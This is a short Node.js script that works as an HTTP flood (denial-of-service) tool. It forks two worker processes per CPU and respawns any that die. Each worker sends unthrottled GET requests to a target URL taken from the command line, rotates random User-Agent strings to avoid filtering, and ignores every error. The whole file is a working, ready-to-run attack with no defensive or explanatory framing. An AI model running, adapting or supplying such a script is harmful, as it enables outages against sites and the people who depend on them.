const { request } = require('undici');
const UserAgent = require('user-agents');
const cluster = require('cluster');
const os = require('os');

const TARGET_URL = process.argv[2] || 'https://test.zoomov.cat';

const numCPUs = os.cpus().length * 2;

if (cluster.isMaster) {
  try {
    new URL(TARGET_URL);
  } catch (err) {
    process.exit(1);
  }

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    cluster.fork();
  });
} else {
  setInterval(async () => {
    try {
      const userAgent = new UserAgent().toString();

      const { statusCode, headers, body } = await request(TARGET_URL, {
        headers: {
          'User-Agent': userAgent,
        },
        method: 'GET',
      });
    } catch (err) {}
  }, 0);
}
